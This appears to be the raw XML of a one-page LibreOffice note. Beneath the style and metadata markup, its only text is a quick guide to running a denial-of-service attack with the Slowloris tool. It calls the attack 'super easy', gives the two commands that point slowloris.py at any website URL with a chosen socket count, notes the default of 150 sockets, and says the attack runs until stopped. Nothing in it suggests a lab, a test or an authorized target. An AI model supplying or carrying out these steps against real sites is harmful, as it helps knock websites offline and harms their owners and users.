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58b89" officeooo:paragraph-rsid="00058b89" style:font-size-asian="17.5pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="25pt" officeooo:rsid="00058b89" officeooo:paragraph-rsid="00058b89" style:font-size-asian="25pt" style:font-size-complex="25pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" officeooo:rsid="00058b89" officeooo:paragraph-rsid="00058b89" style:font-size-asian="13.1000003814697pt" style:font-size-complex="15pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" fo:font-size="15pt" officeooo:rsid="00058b89" officeooo:paragraph-rsid="00058b89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DOS Attack with Slowloris</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P3">(Super Easy, literally two lines)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">cd slowloris</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">python3 slowloris.py [website url] -s [number of sockets]</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3">Can leave out ‘-s’ and ‘[number of sockets’ for default 150 sockets</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Attack will run until stopp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5:28:28.131666935</meta:creation-date>
    <dc:date>2021-03-23T15:31:19.892703254</dc:date>
    <meta:editing-duration>PT2M52S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="6" meta:word-count="36" meta:character-count="224" meta:non-whitespace-character-count="194"/>
    <meta:generator>LibreOffice/7.0.3.1$Linux_X86_64 LibreOffice_project/00$Build-1</meta:generator>
  </office:meta>
</office:document-meta>
</file>